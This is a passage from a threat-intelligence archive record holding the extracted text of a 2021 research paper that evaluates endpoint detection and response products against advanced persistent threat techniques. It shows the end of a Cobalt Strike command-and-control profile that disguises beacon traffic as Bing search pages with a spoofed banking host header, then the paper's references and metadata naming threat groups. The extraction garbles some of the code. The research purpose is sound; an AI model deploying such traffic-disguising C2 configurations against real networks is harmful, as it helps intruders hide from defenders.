`xmlns:Web=\\\"http://schemas.`\n```\nlive.com/Web\n/\\\"><script type=\\\"text/javascript\\\">//<![CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>Bing</title><meta\n\n```\n_�→_ `content=\\\"text/html; charset=utf-8\\\" http-equiv=\\\"content-type\\\" /><link`\n\n_�→_ `href=\\\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\\\" rel=\\\"alternate\\\" title=\\\"XML\\\"`\n\n_�→_ `type=\\\"text/xml\\\" /><link href=\\\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\\\"`\n\n_�→_ `rel=\\\"alternate\\\" title=\\\"RSS\\\" type=\\\"application/rss+xml\\\" /><link href=\\\"/sa/simg/bing_p_rr_teal_min.ico\\\"`\n\n_�→_ `rel=\\\"shortcut icon\\\" /><script type=\\\"text/javascript\\\">//<![CDATA[\";`\n```\nappend \"G={ST:(si_ST?si_ST:new Date),Mkt:\\\"en-US\\\",RTL:false,Ver:\\\"53\\\",IG:\\\"RcAjyxgJIzSo1gxEx2lLx5FGE36hjuXg\\\",\nEventID:\\\"fhqcX9i5ngaxZ5XsJ2Kgey7PKIR5l14k\\\",MN:\\\"SERP\\\",V:\\\"web\\\",P:\\\"SERP\\\",DA:\\\"CO4\\\",\nSUIH:\\\"meYGIBcAfjKoojaWfPRGvi\\\", gpUrl:\\\"/fd/ls/GLinkPing.aspx?\\\"\n}; _G.lsUrl=\\\"/fd/ls/l?IG=\\\"+_G.IG ;curUrl=\\\"http://www.\nbing.com/search\\\";function si_T(a){ if(document.images){_G.GPImg=new\n\n```\n_�→_ `Image;_G.GPImg.src=_G.gpUrl+\\\"IG=\\\"+_G.IG+\\\"&\\\"+a;}return true;};//]]></script><style`\n\n_�→_ `type=\\\"text/css\\\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,`\n```\n.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:\nafter,.sw_st2:after,.sw_plus:\n\n```\n_�→_ `after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,`\n```\n.sw_down:after,.b_expandToggle:\nafter,.sw_calc:after,.sw_fbi:after,\";\nprint;\n}\n}\n}\nhttp-post {\nset uri \"/Search/\";\nset verb \"GET\";\nclient {\nheader \"Host\" \"www.a-banking.com\";\nheader \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\";\nheader \"Cookie\" \"DUP=Q=H87cos1opc7Klawe6Lc8jR9&K=733873714&A=5&LE\";\noutput {\nbase64url;\nparameter \"q\";\n}\nparameter \"go\" \"Search\";\nparameter \"qs\" \"bs\";\nid {\nbase64url;\nparameter \"form\";\n}\n}\nserver {\nheader \"Cache-Control\" \"private, max-age=0\";\nheader \"Content-Type\" \"text/html; charset=utf-8\";\nheader \"Vary\" \"Accept-Encoding\";\n\n```\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 420\n```\nheader \"Server\" \"Microsoft-IIS/8.5\";\nheader \"Connection\" \"close\";\noutput {\nnetbios;\nprepend \"<!DOCTYPE html><html lang=\\\"en\\\" xml:lang=\\\"en\\\" xmlns=\\\"\nhttp://www.w3.org/1999/xhtml\\\" xmlns:\nWeb=\\\"\nhttp://schemas.live.com/Web/\\\">\n<script type=\\\"text/javascript\\\">//<![CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>\nBing</title><meta content=\\\"text/html; charset=utf-8\\\" http-equiv=\\\"content-type\\\" /><link\n\n```\n_�→_ `href=\\\"/search?format=rss&amp;q=canary&amp;`\n```\ngo=Search&amp;qs=bs&amp;form=QBRE\\\" rel=\\\"alternate\\\" title=\\\"XML\\\" type=\\\"text/xml\\\" /><link\n\n```\n_�→_ `href=\\\"/search?format=rss&amp;q=canary&amp;`\n```\ngo=Search&amp;qs=bs&amp;form=QBRE\\\" rel=\\\"alternate\\\" title=\\\"RSS\\\" type=\\\"application/rss+xml\\\" /><link\n\n```\n_�→_ `href=\\\"/sa/simg/bing_p_rr_teal_min.ico\\\"`\n```\nrel=\\\"shortcut icon\\\" /><script type=\\\"text/javascript\\\">//<![CDATA[\";\nappend \"G={ST:(si_ST?si_ST:new Date),Mkt:\\\"en-US\\\",RTL:false,Ver:\\\"53\\\",IG:\\\"Ekf15rVExpRhlduPXXHkQDisEd1YRD1A\\\",\n\n```\n_�→_ `EventID:\\\"YXSxDqQzK1KnqZVSVLLiQVqtwtRGMVE9\\\",MN:\\\"SERP\\\",V:\\\"web\\\",P:\\\"SERP\\\",DA:\\\"CO4\\\",`\n```\nSUIH:\\\"OBJhNcrOC72Z3mr21coFQw\\\"\n,gpUrl:\\\"/fd/ls/GLinkPing.aspx?\\\" }; _G.lsUrl=\\\"\n/fd/ls/l?IG=\\\"+_G.IG ;curUrl=\\\"http://www.bing.com/search\\\";function si_T(a){ if(document.images){_G.GPImg=new\n\n```\n_�→_ `Image;_G.GPImg.src=_G.gpUrl+\\\"IG=\\\"+_G.IG+\\\"&\\\"+a;}return true;};//]]></script><style`\n\n_�→_ `type=\\\"text/css\\\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,`\n```\n.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,\n.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,\n.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,\";\nprint;\n}\n}\n}\nhttp-stager {\nserver {\nheader \"Cache-Control\" \"private, max-age=0\";\nheader \"Content-Type\" \"text/html; charset=utf-8\";\nheader \"Vary\" \"Accept-Encoding\";\nheader \"Server\" \"Microsoft-IIS/8.5\";\nheader \"Connection\" \"close\";\n}\n}\n\n```\n\n**References**\n\n1. [Forum, W.E. Wild Wide Web Consequences of Digital Fragmentation. Available online: https://reports.weforum.org/global-](https://reports.weforum.org/global-risks-report-2020/wild-wide-web/)\n[risks-report-2020/wild-wide-web/ (accessed on 8 July 2021).](https://reports.weforum.org/global-risks-report-2020/wild-wide-web/)\n2. [Oltsik, J. 2017: Security Operations Challenges, Priorities, and Strategies. Available online: http://pages.siemplify.co/rs/182-](http://pages.siemplify.co/rs/182-SXA-457/images/ESG-Research-Report.pdf)\n[SXA-457/images/ESG-Research-Report.pdf (accessed on 8 July 2021).](http://pages.siemplify.co/rs/182-SXA-457/images/ESG-Research-Report.pdf)\n3. [Chuvakin, A. Named: Endpoint Threat Detection & Response. Available online: https://blogs.gartner.com/anton-chuvakin/20](https://blogs.gartner.com/anton-chuvakin/2013/07/26/named-endpoint-threat-detection-response/)\n[13/07/26/named-endpoint-threat-detection-response/ (accessed on 8 July 2021).](https://blogs.gartner.com/anton-chuvakin/2013/07/26/named-endpoint-threat-detection-response/)\n4. [Campfield, M. The problem with (most) network detection and response. Netw. Secur. 2020, 2020, 6–9. [CrossRef]](http://doi.org/10.1016/S1353-4858(20)30104-5)\n5. Hassan, W.U.; Bates, A.; Marino, D. Tactical provenance analysis for endpoint detection and response systems. In Proceedings of\nthe 2020 IEEE Symposium on Security and Privacy (SP), San Francisco, CA, USA, 18–21 May 2020; pp. 1172–1189.\n6. Chen, P.; Desmet, L.; Huygens, C. A study on advanced persistent threats. In IFIP International Conference on Communications and\n_Multimedia Security; Springer: Berlin/Heidelberg, Germany, 2014; pp. 63–72._\n7. Giura, P.; Wang, W. A Context-Based Detection Framework for Advanced Persistent Threats. In Proceedings of the 2012\n[International Conference on Cyber Security, Alexandria, VA, USA, 14–16 December 2012; pp. 69–74. [CrossRef]](http://dx.doi.org/10.1109/CyberSecurity.2012.16)\n8. Sood, A.K.; Enbody, R.J. Targeted Cyberattacks: A Superset of Advanced Persistent Threats. IEEE Secur. Priv. 2013, 11, 54–61.\n\n[[CrossRef]](http://dx.doi.org/10.1109/MSP.2012.90)\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 421\n\n9. Brogi, G.; Tong, V.V.T. Terminaptor: Highlighting advanced persistent threats through information flow tracking. In Proceedings\nof the 2016 8th IFIP International Conference on New Technologies, Mobility and Security (NTMS), Larnaca, Cyprus, 21–23\nNovember 2016; pp. 1–5.\n10. Alshamrani, A.; Myneni, S.; Chowdhary, A.; Huang, D. A survey on advanced persistent threats: Techniques, solutions,\n[challenges, and research opportunities. IEEE Commun. Surv. Tutorials 2019, 21, 1851–1877. [CrossRef]](http://dx.doi.org/10.1109/COMST.2019.2891891)\n11. [Mansfield-Devine, S. Fileless attacks: Compromising targets without malware. Netw. Secur. 2017, 2017, 7–11. [CrossRef]](http://dx.doi.org/10.1016/S1353-4858(17)30037-5)\n12. [Campbell, C.; Graeber, M.; Goh, P.; Bayne, J. Living Off The Land Binaries and Scripts. Available online: https://lolbas-project.](https://lolbas-project.github.io/)\n[github.io/ (accessed on 8 July 2021).](https://lolbas-project.github.io/)\n13. Hutchins, E.M.; Cloppert, M.J.; Amin, R.M. Intelligence-driven computer network defense informed by analysis of adversary\ncampaigns and intrusion kill chains. Lead. Issues Inf. Warf. Secur. Res. 2011, 1, 80.\n14. Strom, B.E.; Applebaum, A.; Miller, D.P.; Nickels, K.C.; Pennington, A.G.; Thomas, C.B. Mitre att&ck: Design and philosophy.\n_Tech. Rep. 2018._\n15. [Symantec Enterprise. Threat Landscape Trends—Q3 2020. Available online: https://symantec-enterprise-blogs.security.com/](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/threat-landscape-trends-q3-2020)\n[blogs/threat-intelligence/threat-landscape-trends-q3-2020 (accessed on 8 July 2021).](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/threat-landscape-trends-q3-2020)\n16. [Microsoft. Memory-Mapped Files. Available online: https://docs.microsoft.com/en-us/dotnet/standard/io/memory-mapped-](https://docs.microsoft.com/en-us/dotnet/standard/io/memory-mapped-files)\n[files (accessed on 8 July 2021)](https://docs.microsoft.com/en-us/dotnet/standard/io/memory-mapped-files)\n17. [Osborne, C. Hackers Exploit Windows Error Reporting Service in New Fileless Attack. Available online: https://www.zdnet.](https://www.zdnet.com/article/hackers-exploit-windows-error-reporting-service-in-new-fileless-attack/)\n[com/article/hackers-exploit-windows-error-reporting-service-in-new-fileless-attack/ (accessed on 8 July 2021)](https://www.zdnet.com/article/hackers-exploit-windows-error-reporting-service-in-new-fileless-attack/)\n18. Apostolopoulos, T.; Katos, V.; Choo, K.K.R.; Patsakis, C. Resurrecting anti-virtualization and anti-debugging: Unhooking your\n[hooks. Future Gener. Comput. Syst. 2021, 116, 393–405. [CrossRef]](http://dx.doi.org/10.1016/j.future.2020.11.004)\n19. [de Plaa, C. Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR. Available online: https://outflank.](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)\n[nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/ (accessed on 8 July 2021)](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)\n20. Luo, X.; Brody, R.; Seazzu, A.; Burd, S. Social Engineering: The Neglected Human Factor for Information Security Management.\n_[Inf. Resour. Manag. J. (IRMJ) 2011, 24, 1–8. [CrossRef]](http://dx.doi.org/10.4018/irmj.2011070101)_\n21. Metalidou, E.; Marinagi, C.; Trivellas, P.; Eberhagen, N.; Skourlas, C.; Giannakopoulos, G. The human factor of information\n[security: Unintentional damage perspective. Procedia-Soc. Behav. Sci. 2014, 147, 424–428. [CrossRef]](http://dx.doi.org/10.1016/j.sbspro.2014.07.133)\n22. Ghafir, I.; Saleem, J.; Hammoudeh, M.; Faour, H.; Prenosil, V.; Jaf, S.; Jabbar, S.; Baker, T. Security threats to critical infrastructure:\n[The human factor. J. Supercomput. 2018, 74, 4986–5002. [CrossRef]](http://dx.doi.org/10.1007/s11227-018-2337-2)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/AV Tech/An Empirical Assessment of Endpoint Detection and Response Systems against Advanced Persistent Threats Attack Vectors.pdf"
    ],
    "report_names": [
        "An Empirical Assessment of Endpoint Detection and Response Systems against Advanced Persistent Threats Attack Vectors.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535596,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1625861370,
    "ts_modification_date": 1625840189,
    "files": {
        "pdf": "https://archive.orkl.eu/b798f7d59fab5b25b8bfdc027eb20b9a6a118bc7.pdf",
        "text": "https://archive.orkl.eu/b798f7d59fab5b25b8bfdc027eb20b9a6a118bc7.txt",
        "img": "https://archive.orkl.eu/b798f7d59fab5b25b8bfdc027eb20b9a6a118bc7.jpg"
    }
}